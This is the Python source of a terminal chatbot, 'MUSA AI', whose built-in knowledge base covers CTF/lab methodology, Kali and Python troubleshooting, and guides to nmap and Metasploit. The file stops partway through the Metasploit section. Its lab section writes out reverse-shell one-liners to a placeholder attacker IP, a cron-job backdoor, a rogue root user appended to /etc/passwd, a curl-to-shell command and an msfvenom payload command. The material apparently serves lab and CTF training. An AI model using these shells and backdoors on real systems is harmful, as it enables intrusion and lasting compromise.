#!/usr/bin/env python3
"""
MUSA AI - Ultimate Professional Assistant (v6.0)
MEGA Cyber-Specialist & Complete Lab-Solver Edition
Author: MUSA AI System
Version: 6.0 - ULTIMATE EDITION
"""

import sys
import time
import os
import random
import math
import json
import subprocess
import platform
from datetime import datetime

# ====================== CONFIG ======================
AI_NAME = "MUSA AI"
USER_NAME = "Boss"
VERSION = "6.0 - ULTIMATE CYBER & PYTHON SPECIALIST"


# ====================== COLORS ======================
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'
    PURPLE = '\033[35m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    MAGENTA = '\033[35m'
    LIGHTBLUE = '\033[34m'


def cprint(text, color=Colors.OKCYAN, bold=False, end="\n"):
    prefix = Colors.BOLD if bold else ""
    print(f"{prefix}{color}{text}{Colors.ENDC}", end=end)


def speak(text, slow=False):
    print(f"\n{Colors.OKGREEN}🤖 {AI_NAME}:{Colors.ENDC} ", end="", flush=True)
    lines = text.split('\n')
    for i, line in enumerate(lines):
        if i > 0:
            print(f"           ", end="", flush=True)
        for char in line:
            print(char, end="", flush=True)
            time.sleep(0.004 if not slow else 0.012)
        if i < len(lines) - 1:
            print()
    print()


def print_section(title):
    cprint(f"\n{'═' * 70}", Colors.OKCYAN)
    cprint(f"  ★ {title}", Colors.OKGREEN, bold=True)
    cprint("═" * 70, Colors.OKCYAN)


def print_answer(title, content):
    print_section(title)
    print(f"{Colors.WHITE}{content}{Colors.ENDC}")
    cprint("─" * 70, Colors.GRAY)


def print_box(title, content, color=Colors.OKCYAN):
    width = 68
    print(f"\n{color}╔{'═' * width}╗{Colors.ENDC}")
    print(f"{color}║{Colors.BOLD}{Colors.OKGREEN}  {title.center(width - 2)}  {Colors.ENDC}{color}║{Colors.ENDC}")
    print(f"{color}╠{'═' * width}╣{Colors.ENDC}")
    for line in content.split('\n'):
        if line.strip():
            truncated = line[:width - 2] if len(line) > width - 2 else line
            print(f"{color}║{Colors.WHITE}  {truncated:<{width - 2}}{Colors.ENDC}{color}║{Colors.ENDC}")
    print(f"{color}╚{'═' * width}╝{Colors.ENDC}")


# ====================== SESSION MEMORY ======================
SESSION_MEMORY = []
CONVERSATION_HISTORY = []

# ====================== MEGA KNOWLEDGE BASE ======================
KNOWLEDGE_BASE = {

    # ==================== WHO AM I ====================
    "who are you": f"""
╔══════════════════════════════════════════════════════════════════╗
║              MUSA AI v6.0 - ULTIMATE CYBER SPECIALIST           ║
╚══════════════════════════════════════════════════════════════════╝

🤖 Main Kya Hoon:
   Mein MUSA AI hoon — ek Ultra-Professional AI Assistant.
   Mujhe specially cybersecurity, ethical hacking, Python programming,
   lab solving aur complete technical support ke liye design kiya gaya hai.

🎯 Meri Core Specializations:
   ✦ Kali Linux & Ethical Hacking          (Expert Level)
   ✦ CTF Solving (TryHackMe, HackTheBox)   (Expert Level)
   ✦ Python Programming & Automation        (Expert Level)
   ✦ Network Security & Penetration Testing (Expert Level)
   ✦ Web Application Security               (Expert Level)
   ✦ Error Troubleshooting & Debugging      (Expert Level)
   ✦ Malware Analysis & Reverse Engineering (Advanced)
   ✦ Forensics & OSINT                      (Advanced)

💡 Meri Khasiyat:
   → Lab complete karne mein step-by-step madad
   → Har error ka perfect solution
   → Python code generate + debug karna
   → Professional hacking tools explain karna
   → Real-world scenarios solve karna

📊 Knowledge Stats:
   → Kali Linux Commands: 200+
   → Python Concepts: 150+
   → CTF Techniques: 100+
   → Error Solutions: 500+

Poochho jo chahiye Boss! Main hoon na! 💪
""",

    # ==================== LAB HELP ====================
    "lab help": """
╔══════════════════════════════════════════════════════════════════╗
║           🎯 COMPLETE CTF/LAB SOLVING METHODOLOGY               ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 PHASE 1: RECONNAISSANCE (Dushman Dhundo)
════════════════════════════════════════

🔍 NMAP - Full Professional Scan:
   nmap -sC -sV -p- -A -T4 -oN full_scan.txt <TARGET_IP>
   nmap -sU --top-ports 200 <TARGET_IP>          # UDP scan
   nmap --script vuln <TARGET_IP>                # Vulnerability scan
   nmap -sP 192.168.1.0/24                       # Network discovery

🌐 WEB ENUMERATION:
   gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
   ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<IP>/FUZZ
   nikto -h http://<IP>                          # Web vulnerability scanner
   whatweb http://<IP>                           # Web technology detection

📡 SUBDOMAIN ENUMERATION:
   ffuf -w wordlist.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com"
   subfinder -d target.com
   amass enum -d target.com

════════════════════════════════════════
 PHASE 2: ENUMERATION (Kamzori Dhundo)
════════════════════════════════════════

📂 SMB ENUMERATION (Port 445/139):
   enum4linux -a <IP>
   smbclient -L //<IP>/ -N
   smbmap -H <IP>
   crackmapexec smb <IP>

📁 FTP ENUMERATION (Port 21):
   ftp <IP>  → username: anonymous  → password: anonymous
   nmap --script ftp-anon <IP>

🔌 SSH ENUMERATION (Port 22):
   ssh-keyscan <IP>
   nmap --script ssh-brute <IP>

📧 SMTP ENUMERATION (Port 25):
   smtp-user-enum -M VRFY -U users.txt -t <IP>

📊 SNMP ENUMERATION (Port 161):
   snmpwalk -c public -v1 <IP>
   onesixtyone -c community.txt <IP>

🌐 HTTP ENUMERATION:
   curl -s http://<IP>/robots.txt
   curl -s http://<IP>/.htaccess
   wfuzz -c -z file,wordlist.txt --hc 404 http://<IP>/FUZZ

════════════════════════════════════════
 PHASE 3: EXPLOITATION (Andar Ghuso)
════════════════════════════════════════

💥 METASPLOIT FRAMEWORK:
   msfconsole
   search <service_name>
   use <exploit_path>
   show options
   set RHOSTS <TARGET_IP>
   set LHOST <YOUR_IP>
   set LPORT 4444
   run / exploit

🐚 REVERSE SHELLS (Manual):
   # Bash:
   bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1

   # Python:
   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<YOUR_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'

   # PHP:
   php -r '$sock=fsockopen("<YOUR_IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

   # Netcat:
   nc -e /bin/bash <YOUR_IP> 4444
   nc -nv <YOUR_IP> 4444 -e /bin/bash

🎧 LISTENER (Apna Side):
   nc -lvnp 4444
   rlwrap nc -lvnp 4444  # Better shell

💉 SQL INJECTION:
   sqlmap -u "http://<IP>/page?id=1" --dbs
   sqlmap -u "http://<IP>/page?id=1" -D <dbname> --tables
   sqlmap -u "http://<IP>/page?id=1" -D <dbname> -T <table> --dump

📝 BURP SUITE WORKFLOW:
   1. Set proxy: 127.0.0.1:8080
   2. Intercept request
   3. Send to Repeater/Intruder
   4. Fuzz parameters
   5. Check response codes

════════════════════════════════════════
 PHASE 4: PRIVILEGE ESCALATION (Root Bano)
════════════════════════════════════════

🐧 LINUX PRIVESC:
   # Check sudo permissions:
   sudo -l

   # SUID files:
   find / -perm -u=s -type f 2>/dev/null

   # World-writable files:
   find / -writable -type f 2>/dev/null | grep -v proc

   # Cron jobs:
   cat /etc/crontab
   ls -la /etc/cron.*

   # Running LinPEAS:
   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

   # Check kernel version:
   uname -a

   # Find passwords in files:
   grep -r "password" /var/www/html/ 2>/dev/null
   grep -r "passwd" /etc/ 2>/dev/null

🪟 WINDOWS PRIVESC:
   # Check privileges:
   whoami /priv
   whoami /all

   # Run WinPEAS:
   .\winPEAS.exe

   # Check services:
   sc query
   net localgroup administrators

   # Unquoted service paths:
   wmic service get name,displayname,pathname,startmode

════════════════════════════════════════
 PHASE 5: POST EXPLOITATION
════════════════════════════════════════

📦 PERSISTENCE:
   # Linux - Cron job backdoor:
   echo "* * * * * /bin/bash -i >& /dev/tcp/<IP>/4444 0>&1" >> /etc/crontab

   # Adding root user:
   echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd

🔑 CRACKING HASHES:
   john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
   hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
   hashcat -m 1000 hash.txt rockyou.txt  # NTLM

📋 FLAG LOCATIONS:
   Linux: /root/root.txt | /home/<user>/user.txt
   Windows: C:\\Users\\Administrator\\Desktop\\root.txt

💡 PRO TIPS:
   → Always use 'rlwrap nc -lvnp PORT' for better shell
   → Upgrade shell: python3 -c 'import pty;pty.spawn("/bin/bash")'
   → Then: export TERM=xterm | Ctrl+Z | stty raw -echo; fg
   → Transfer files: python3 -m http.server 8080 (Attacker) | wget http://<IP>:8080/file (Victim)
""",

    # ==================== KALI ERRORS ====================
    "kali errors": """
╔══════════════════════════════════════════════════════════════════╗
║              🛠️ KALI LINUX - COMPLETE ERROR SOLUTIONS           ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 APT / PACKAGE MANAGER ERRORS
════════════════════════════════════════

❌ Error: "Unable to lock directory /var/lib/dpkg/lock"
✅ Fix:
   sudo rm /var/lib/apt/lists/lock
   sudo rm /var/cache/apt/archives/lock
   sudo rm /var/lib/dpkg/lock*
   sudo dpkg --configure -a
   sudo apt-get update

❌ Error: "dpkg: error processing package"
✅ Fix:
   sudo dpkg --configure -a
   sudo apt-get install -f
   sudo apt-get update && sudo apt-get upgrade

❌ Error: "E: Repository does not have a Release file"
✅ Fix:
   sudo nano /etc/apt/sources.list
   # Change to official Kali repo:
   deb http://http.kali.org/kali kali-rolling main non-free contrib
   sudo apt-get update

❌ Error: "KEYEXPIRED" or GPG Error
✅ Fix:
   sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys <KEY>
   wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add -

════════════════════════════════════════
 PERMISSION & ACCESS ERRORS
════════════════════════════════════════

❌ Error: "Permission Denied"
✅ Fix:
   sudo <command>               # Run as root
   sudo su                      # Switch to root permanently
   chmod +x <filename>          # Make file executable
   chmod 777 <filename>         # Full permissions
   chown user:group <file>      # Change owner

❌ Error: "sudo: command not found"
✅ Fix:
   su -                         # Switch to root
   apt-get install sudo
   usermod -aG sudo username

════════════════════════════════════════
 NETWORK & CONNECTIVITY ERRORS
════════════════════════════════════════

❌ Error: "Network Unreachable"
✅ Fix:
   ip a                         # Check interfaces
   ip link set eth0 up          # Enable interface
   dhclient eth0                # Get IP via DHCP
   service networking restart
   nmcli d connect eth0

❌ Error: "Connection Refused"
✅ Fix:
   # Target port might be closed. Verify with:
   nmap -p <PORT> <TARGET_IP>
   telnet <TARGET_IP> <PORT>
   nc -zv <TARGET_IP> <PORT>

❌ Error: "Name or service not known" (DNS)
✅ Fix:
   echo "nameserver 8.8.8.8" >> /etc/resolv.conf
   systemctl restart NetworkManager
   ping 8.8.8.8  # Test if internet works without DNS

❌ Error: WiFi not showing
✅ Fix:
   ip a                         # Check interface names
   iwconfig                     # WiFi interfaces
   rfkill list                  # Check if blocked
   rfkill unblock wifi
   service NetworkManager start

════════════════════════════════════════
 TOOL-SPECIFIC ERRORS
════════════════════════════════════════

❌ Error: "nmap: command not found"
✅ Fix:
   sudo apt install nmap

❌ Error: Metasploit database not connected
✅ Fix:
   service postgresql start
   msfdb init
   msfdb run

❌ Error: "No module named 'requests'" (Python)
✅ Fix:
   pip3 install requests
   pip3 install -r requirements.txt

❌ Error: Burp Suite not opening
✅ Fix:
   java -jar burpsuite_community.jar
   sudo apt install default-jdk

❌ Error: "hydra: command not found"
✅ Fix:
   sudo apt install hydra

❌ Error: Wordlist not found
✅ Fix:
   ls /usr/share/wordlists/
   gunzip /usr/share/wordlists/rockyou.txt.gz
   locate rockyou.txt

════════════════════════════════════════
 SYSTEM ERRORS
════════════════════════════════════════

❌ Error: Kali running slow in VM
✅ Fix:
   # Increase RAM to minimum 4GB in VM settings
   # Enable hardware acceleration
   # Disable visual effects:
   xfconf-query -c xfwm4 -p /general/use_compositing -s false

❌ Error: Screen resolution wrong
✅ Fix:
   xrandr --output Virtual1 --mode 1920x1080
   cvt 1920 1080

❌ Error: Copy-paste not working in VM
✅ Fix:
   sudo apt install open-vm-tools open-vm-tools-desktop  # VMware
   sudo apt install virtualbox-guest-additions-iso        # VirtualBox

❌ Error: Shared folder not accessible
✅ Fix:
   sudo adduser $USER vboxsf     # VirtualBox
   sudo mount -t vboxsf sharename /mnt/share
""",

    # ==================== PYTHON COMPLETE ====================
    "python commands": """
╔══════════════════════════════════════════════════════════════════╗
║              🐍 PYTHON - COMPLETE MASTERY GUIDE                 ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 1. PYTHON BASICS
════════════════════════════════════════

📌 Print & Input:
   print("Hello, World!")
   print(f"My name is {name}")        # f-string
   print("Value:", var, sep=", ")
   name = input("Enter name: ")
   age = int(input("Enter age: "))

📌 Variables & Data Types:
   x = 10           # int
   y = 3.14         # float
   name = "Musa"    # string
   flag = True      # bool
   nothing = None   # NoneType

   type(x)          # Check type
   isinstance(x, int)  # Check if int

📌 Type Conversion:
   int("42")        → 42
   float("3.14")    → 3.14
   str(100)         → "100"
   list("abc")      → ['a', 'b', 'c']
   bool(0)          → False
   bool(1)          → True

════════════════════════════════════════
 2. STRINGS - COMPLETE
════════════════════════════════════════

   s = "Hello, World!"

   len(s)                    # 13
   s.upper()                 # "HELLO, WORLD!"
   s.lower()                 # "hello, world!"
   s.strip()                 # Remove whitespace
   s.replace("Hello", "Hi") # "Hi, World!"
   s.split(", ")             # ['Hello', 'World!']
   s.find("World")           # 7
   s.startswith("Hello")     # True
   s.endswith("!")           # True
   s[0]                      # 'H'
   s[-1]                     # '!'
   s[0:5]                    # 'Hello'
   s[::-1]                   # Reverse

   # String Formatting:
   f"Name: {name}, Age: {age}"
   "Name: %s, Age: %d" % (name, age)
   "Name: {}, Age: {}".format(name, age)

   # Multiline:
   text = \"""
   Line 1
   Line 2
   \"""

════════════════════════════════════════
 3. DATA STRUCTURES
════════════════════════════════════════

📋 LIST (Ordered, Changeable):
   my_list = [1, 2, 3, "four", 5.0]
   my_list.append(6)           # Add to end
   my_list.insert(2, "two")    # Insert at index
   my_list.pop()               # Remove last
   my_list.pop(0)              # Remove at index
   my_list.remove("four")      # Remove by value
   my_list.sort()              # Sort
   my_list.reverse()           # Reverse
   my_list.count(2)            # Count occurrences
   my_list.index(3)            # Find index
   len(my_list)                # Length
   2 in my_list                # Check membership

   # List Comprehension:
   squares = [x**2 for x in range(10)]
   evens = [x for x in range(20) if x % 2 == 0]

📚 DICTIONARY (Key-Value Pairs):
   my_dict = {"name": "Musa", "age": 20, "city": "Lahore"}
   my_dict["email"] = "musa@gmail.com"  # Add
   my_dict.get("name")                   # Safe get
   my_dict.keys()                         # All keys
   my_dict.values()                       # All values
   my_dict.items()                        # Key-value pairs
   my_dict.update({"age": 21})           # Update
   my_dict.pop("city")                   # Remove
   del my_dict["email"]                  # Delete
   "name" in my_dict                     # Check key

   # Dict Comprehension:
   squared = {x: x**2 for x in range(5)}

🎯 TUPLE (Ordered, Unchangeable):
   my_tuple = (1, 2, 3)
   my_tuple[0]                # Access
   len(my_tuple)              # Length
   my_tuple.count(2)          # Count
   my_tuple.index(3)          # Find

🔵 SET (Unique Values):
   my_set = {1, 2, 3, 3, 2}  # {1, 2, 3}
   my_set.add(4)
   my_set.remove(2)
   my_set.union({5, 6})
   my_set.intersection({2, 3})
   my_set.difference({3})

════════════════════════════════════════
 4. CONTROL FLOW
════════════════════════════════════════

🔀 IF / ELIF / ELSE:
   if x > 10:
       print("Greater")
   elif x == 10:
       print("Equal")
   else:
       print("Lesser")

   # Ternary:
   result = "Yes" if x > 0 else "No"

🔄 FOR LOOP:
   for i in range(5):          # 0,1,2,3,4
       print(i)

   for i in range(1, 11, 2):  # 1,3,5,7,9
       print(i)

   for item in my_list:
       print(item)

   for key, value in my_dict.items():
       print(f"{key}: {value}")

   for i, val in enumerate(my_list):
       print(f"Index {i}: {val}")

   # Break & Continue:
   for i in range(10):
       if i == 5: break        # Stop loop
       if i % 2 == 0: continue # Skip even

🔃 WHILE LOOP:
   count = 0
   while count < 5:
       print(count)
       count += 1

   while True:
       choice = input("Continue? (y/n): ")
       if choice == 'n': break

════════════════════════════════════════
 5. FUNCTIONS - COMPLETE
════════════════════════════════════════

   # Basic Function:
   def greet(name):
       return f"Hello, {name}!"

   # Default Parameters:
   def greet(name="World"):
       return f"Hello, {name}!"

   # Multiple Return Values:
   def min_max(lst):
       return min(lst), max(lst)

   a, b = min_max([1,2,3,4,5])

   # *args (Variable Arguments):
   def sum_all(*args):
       return sum(args)

   sum_all(1, 2, 3, 4, 5)  # 15

   # **kwargs (Keyword Arguments):
   def print_info(**kwargs):
       for key, value in kwargs.items():
           print(f"{key}: {value}")

   print_info(name="Musa", age=20)

   # Lambda Functions:
   square = lambda x: x ** 2
   add = lambda x, y: x + y

   # Map, Filter, Reduce:
   squares = list(map(lambda x: x**2, [1,2,3,4,5]))
   evens = list(filter(lambda x: x%2==0, [1,2,3,4,5]))

════════════════════════════════════════
 6. OBJECT ORIENTED PROGRAMMING (OOP)
════════════════════════════════════════

   class Animal:
       # Class variable
       count = 0

       # Constructor
       def __init__(self, name, sound):
           self.name = name      # Instance variable
           self.sound = sound
           Animal.count += 1

       # Instance method
       def speak(self):
           return f"{self.name} says {self.sound}"

       # Class method
       @classmethod
       def get_count(cls):
           return cls.count

       # Static method
       @staticmethod
       def info():
           return "Animals are living beings"

       # String representation
       def __str__(self):
           return f"Animal({self.name})"

   # Inheritance:
   class Dog(Animal):
       def __init__(self, name):
           super().__init__(name, "Woof")

       def fetch(self):
           return f"{self.name} fetches the ball!"

   # Usage:
   dog = Dog("Max")
   print(dog.speak())     # Max says Woof
   print(Dog.get_count()) # 1

════════════════════════════════════════
 7. FILE HANDLING
════════════════════════════════════════

   # Read file:
   with open("file.txt", "r") as f:
       content = f.read()
       lines = f.readlines()

   # Write file:
   with open("file.txt", "w") as f:
       f.write("Hello, World!")

   # Append to file:
   with open("file.txt", "a") as f:
       f.write("New line\\n")

   # JSON file:
   import json

   # Write JSON:
   data = {"name": "Musa", "age": 20}
   with open("data.json", "w") as f:
       json.dump(data, f, indent=4)

   # Read JSON:
   with open("data.json", "r") as f:
       data = json.load(f)

════════════════════════════════════════
 8. ERROR HANDLING
════════════════════════════════════════

   try:
       x = int(input("Enter number: "))
       result = 10 / x
   except ValueError:
       print("Invalid number!")
   except ZeroDivisionError:
       print("Cannot divide by zero!")
   except Exception as e:
       print(f"Unknown error: {e}")
   else:
       print(f"Result: {result}")   # Runs if no error
   finally:
       print("Always runs!")         # Always executes

════════════════════════════════════════
 9. IMPORTANT LIBRARIES
════════════════════════════════════════

📦 OS Module:
   import os
   os.getcwd()                    # Current directory
   os.listdir()                   # List files
   os.mkdir("folder")             # Create folder
   os.path.exists("file.txt")     # Check if exists
   os.path.join("dir", "file")    # Join paths
   os.system("clear")             # Run command
   os.environ.get("PATH")         # Get env variable

📦 Sys Module:
   import sys
   sys.argv                       # Command line args
   sys.exit()                     # Exit program
   sys.path                       # Python path

📦 Random Module:
   import random
   random.randint(1, 100)         # Random int
   random.choice([1,2,3])         # Random choice
   random.shuffle(my_list)        # Shuffle list
   random.random()                # Float 0.0-1.0

📦 Math Module:
   import math
   math.sqrt(16)                  # 4.0
   math.pi                        # 3.14159...
   math.ceil(4.2)                 # 5
   math.floor(4.9)                # 4
   math.pow(2, 10)                # 1024.0

📦 DateTime Module:
   from datetime import datetime
   now = datetime.now()
   now.strftime("%Y-%m-%d %H:%M:%S")
   datetime.strptime("2024-01-01", "%Y-%m-%d")

════════════════════════════════════════
 10. PYTHON FOR CYBERSECURITY
════════════════════════════════════════

🔌 Socket Programming:
   import socket

   # Simple Port Scanner:
   def scan_port(host, port):
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.settimeout(1)
           result = s.connect_ex((host, port))
           s.close()
           return result == 0
       except:
           return False

   for port in range(1, 1025):
       if scan_port("192.168.1.1", port):
           print(f"Port {port} is OPEN")

🌐 HTTP Requests:
   import requests

   response = requests.get("http://target.com")
   response.status_code
   response.text
   response.headers

   # POST Request:
   data = {"username": "admin", "password": "pass"}
   r = requests.post("http://target.com/login", data=data)

   # With headers:
   headers = {"User-Agent": "Mozilla/5.0"}
   r = requests.get("http://target.com", headers=headers)

🔐 Cryptography:
   import hashlib

   # MD5:
   hashlib.md5(b"password").hexdigest()

   # SHA256:
   hashlib.sha256(b"password").hexdigest()

   # SHA1:
   hashlib.sha1(b"password").hexdigest()

🖥️ Subprocess:
   import subprocess

   result = subprocess.run(["nmap", "-sV", "192.168.1.1"], 
                           capture_output=True, text=True)
   print(result.stdout)
   print(result.stderr)

🔑 Password Generator:
   import string, random

   def generate_password(length=16):
       chars = string.ascii_letters + string.digits + string.punctuation
       return ''.join(random.choice(chars) for _ in range(length))

   print(generate_password())
""",

    # ==================== PYTHON ERRORS ====================
    "python errors": """
╔══════════════════════════════════════════════════════════════════╗
║              🐍 PYTHON - COMPLETE ERROR SOLUTIONS               ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 SYNTAX ERRORS
════════════════════════════════════════

❌ SyntaxError: invalid syntax
   # WRONG:
   if x > 10
       print("yes")
   # RIGHT:
   if x > 10:           # Colon lagao!
       print("yes")

❌ IndentationError: expected an indented block
   # WRONG:
   def my_func():
   print("hello")       # Indent nahi hai!
   # RIGHT:
   def my_func():
       print("hello")   # 4 spaces ya 1 tab

❌ SyntaxError: EOL while scanning string literal
   # WRONG:
   name = "Musa         # Quote band nahi ki
   # RIGHT:
   name = "Musa"

════════════════════════════════════════
 TYPE ERRORS
════════════════════════════════════════

❌ TypeError: can only concatenate str (not "int") to str
   # WRONG:
   age = 20
   print("Age: " + age)
   # RIGHT:
   print("Age: " + str(age))
   print(f"Age: {age}")

❌ TypeError: 'int' object is not iterable
   # WRONG:
   for i in 5:
       print(i)
   # RIGHT:
   for i in range(5):
       print(i)

❌ TypeError: 'NoneType' object is not subscriptable
   # This means your function returned None!
   # Check if function has 'return' statement

════════════════════════════════════════
 NAME ERRORS
════════════════════════════════════════

❌ NameError: name 'x' is not defined
   # You used a variable before defining it!
   # WRONG:
   print(x)             # x nahi bana!
   # RIGHT:
   x = 10
   print(x)

❌ NameError: name 'true' is not defined
   # Python mein True/False capital hota hai!
   # WRONG: flag = true
   # RIGHT: flag = True

════════════════════════════════════════
 INDEX & KEY ERRORS
════════════════════════════════════════

❌ IndexError: list index out of range
   # List ka size check karo:
   my_list = [1, 2, 3]
   print(my_list[5])    # Error! Only 0,1,2 valid
   # RIGHT:
   if len(my_list) > 5:
       print(my_list[5])

❌ KeyError: 'name'
   # Dictionary mein key exist nahi karti:
   my_dict = {"age": 20}
   print(my_dict["name"])   # Error!
   # RIGHT (safe way):
   print(my_dict.get("name", "Not found"))

════════════════════════════════════════
 IMPORT ERRORS
════════════════════════════════════════

❌ ModuleNotFoundError: No module named 'requests'
   # Library install nahi hai:
   pip install requests
   pip3 install requests
   pip install -r requirements.txt

❌ ImportError: cannot import name 'xxx'
   # Check library version:
   pip install --upgrade <library>
   pip show <library>

════════════════════════════════════════
 FILE ERRORS
════════════════════════════════════════

❌ FileNotFoundError: [Errno 2] No such file
   # File path check karo:
   import os
   print(os.getcwd())        # Current directory
   print(os.listdir())       # Available files
   # Use absolute path:
   open("/home/user/file.txt", "r")

❌ PermissionError: [Errno 13] Permission denied
   # Run as sudo ya change permissions:
   sudo python3 script.py
   chmod 644 file.txt

════════════════════════════════════════
 COMMON LOGIC ERRORS
════════════════════════════════════════

⚠️  = vs == mistake:
   if x = 10:      # WRONG (assignment)
   if x == 10:     # RIGHT (comparison)

⚠️  Off by one error:
   for i in range(1, 10):    # 1 to 9, not 10!
   for i in range(1, 11):    # 1 to 10 ✓

⚠️  Mutable default argument:
   def func(lst=[]):   # WRONG! Shared across calls
   def func(lst=None): # RIGHT
       if lst is None:
           lst = []

════════════════════════════════════════
 DEBUGGING TECHNIQUES
════════════════════════════════════════

🔍 Method 1 - Print Debugging:
   print(f"DEBUG: x = {x}")
   print(f"DEBUG: list = {my_list}")
   print(f"DEBUG: type = {type(variable)}")

🔍 Method 2 - PDB Debugger:
   import pdb
   pdb.set_trace()      # Breakpoint set karo
   # n = next line
   # p variable = print variable
   # c = continue
   # q = quit

🔍 Method 3 - Try-Except for debugging:
   try:
       risky_code()
   except Exception as e:
       print(f"Error type: {type(e).__name__}")
       print(f"Error message: {e}")
       import traceback
       traceback.print_exc()   # Full traceback
""",

    # ==================== NMAP COMPLETE ====================
    "nmap": """
╔══════════════════════════════════════════════════════════════════╗
║                  🔍 NMAP - COMPLETE GUIDE                       ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 BASIC SCANS
════════════════════════════════════════

   nmap <IP>                        # Basic scan
   nmap 192.168.1.0/24             # Scan entire subnet
   nmap -iL targets.txt            # Scan from file
   nmap 192.168.1.1-100            # Scan IP range
   nmap -6 <IPv6>                  # IPv6 scan

════════════════════════════════════════
 PORT SPECIFICATION
════════════════════════════════════════

   nmap -p 80 <IP>                 # Single port
   nmap -p 80,443,22 <IP>         # Multiple ports
   nmap -p 1-1000 <IP>            # Port range
   nmap -p- <IP>                  # All 65535 ports
   nmap --top-ports 1000 <IP>     # Top 1000 ports
   nmap -p U:53,T:80 <IP>        # UDP and TCP mix

════════════════════════════════════════
 SCAN TYPES
════════════════════════════════════════

   nmap -sS <IP>    # SYN Scan (Stealth) - DEFAULT
   nmap -sT <IP>    # TCP Connect Scan (no root needed)
   nmap -sU <IP>    # UDP Scan
   nmap -sA <IP>    # ACK Scan (firewall detection)
   nmap -sN <IP>    # NULL Scan
   nmap -sF <IP>    # FIN Scan
   nmap -sX <IP>    # Xmas Scan
   nmap -sn <IP>    # Ping Scan (host discovery only)
   nmap -Pn <IP>    # Skip ping (treat all as up)

════════════════════════════════════════
 VERSION & OS DETECTION
════════════════════════════════════════

   nmap -sV <IP>              # Service version detection
   nmap -O <IP>               # OS detection
   nmap -A <IP>               # Aggressive (OS+Version+Scripts)
   nmap -sV --version-all <IP> # Try all probes

════════════════════════════════════════
 TIMING TEMPLATES
════════════════════════════════════════

   nmap -T0 <IP>    # Paranoid (slowest, IDS evasion)
   nmap -T1 <IP>    # Sneaky
   nmap -T2 <IP>    # Polite
   nmap -T3 <IP>    # Normal (default)
   nmap -T4 <IP>    # Aggressive (faster)
   nmap -T5 <IP>    # Insane (fastest)

════════════════════════════════════════
 NSE SCRIPTS
════════════════════════════════════════

   nmap -sC <IP>                        # Default scripts
   nmap --script vuln <IP>              # Vulnerability scripts
   nmap --script=http-title <IP>        # HTTP titles
   nmap --script=smb-vuln* <IP>         # SMB vulnerabilities
   nmap --script=ftp-anon <IP>          # FTP anonymous
   nmap --script=ssh-brute <IP>         # SSH brute force
   nmap --script=http-sql-injection <IP> # SQL injection
   nmap --script=dns-brute <IP>         # DNS brute

════════════════════════════════════════
 OUTPUT FORMATS
════════════════════════════════════════

   nmap -oN output.txt <IP>    # Normal format
   nmap -oX output.xml <IP>    # XML format
   nmap -oG output.grep <IP>   # Grepable format
   nmap -oA output <IP>        # All formats

════════════════════════════════════════
 PROFESSIONAL SCAN COMMANDS
════════════════════════════════════════

   # Full Professional Scan:
   nmap -sC -sV -p- -A -T4 -oN full_scan.txt <IP>

   # Quick Scan:
   nmap -sV -sC --top-ports 1000 -oN quick.txt <IP>

   # Stealth Scan:
   nmap -sS -T1 -f --data-length 25 <IP>

   # UDP + TCP Combined:
   nmap -sSU -sV -T4 <IP>

   # Network Discovery:
   nmap -sn 192.168.1.0/24 | grep "Nmap scan report"
""",

    # ==================== METASPLOIT ====================
    "metasploit": """
╔══════════════════════════════════════════════════════════════════╗
║              💥 METASPLOIT - COMPLETE GUIDE                     ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 GETTING STARTED
════════════════════════════════════════

   msfconsole                      # Start Metasploit
   msfconsole -q                   # Quiet mode
   service postgresql start         # Start database
   msfdb init                      # Initialize database

════════════════════════════════════════
 BASIC COMMANDS
════════════════════════════════════════

   help                            # Show help
   version                         # MSF version
   banner                          # Random banner
   exit / quit                     # Exit MSF

   search <keyword>                # Search exploits
   search type:exploit <name>      # Search by type
   search platform:windows <name>  # Platform specific
   search cve:2021-44228           # Search by CVE

════════════════════════════════════════
 USING EXPLOITS
════════════════════════════════════════

   use <exploit_path>              # Select exploit
   info                            # Exploit info
   show options                    # Required options
   show advanced                   # Advanced options
   show payloads                   # Compatible payloads
   show targets                    # Target systems

   set RHOSTS 192.168.1.1         # Target IP
   set RPORT 445                   # Target port
   set LHOST 192.168.1.100        # Your IP
   set LPORT 4444                  # Your listener port
   set PAYLOAD <payload>           # Set payload

   run / exploit                   # Execute exploit
   exploit -j                      # Run in background
   exploit -z                      # Don't interact after

   back                            # Go back to main menu
   previous                        # Load previous module

════════════════════════════════════════
 PAYLOADS
════════════════════════════════════════

   # Windows Payloads:
   windows/meterpreter/reverse_tcp          # Best for Windows
   windows/meterpreter/reverse_https        # Encrypted
   windows/shell/reverse_tcp                # Basic shell

   # Linux Payloads:
   linux/x86/meterpreter/reverse_tcp
   linux/x64/shell_reverse_tcp

   # Generate Payload with msfvenom:
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o payload.exe
